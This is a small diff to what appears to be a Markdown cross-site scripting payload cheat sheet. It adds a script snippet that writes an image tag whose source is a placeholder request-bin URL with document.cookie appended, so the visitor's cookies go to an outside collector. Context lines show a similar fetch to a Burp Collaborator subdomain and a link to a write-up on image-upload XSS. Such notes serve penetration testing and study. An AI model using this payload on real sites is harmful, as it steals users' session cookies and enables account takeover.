@@ -190,6 +190,11 @@ fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
 </script>
 ```
 
+```javascript
+<script>
+document.write("<img src='https://your_request_bin_url?c=" + document.cookie + "'>");
+</script>
+```
 ##### xss using image upload 
 [usefull writeup](https://blog.doyensec.com/2020/04/30/polymorphic-images-for-xss.html)
 ##### notes 
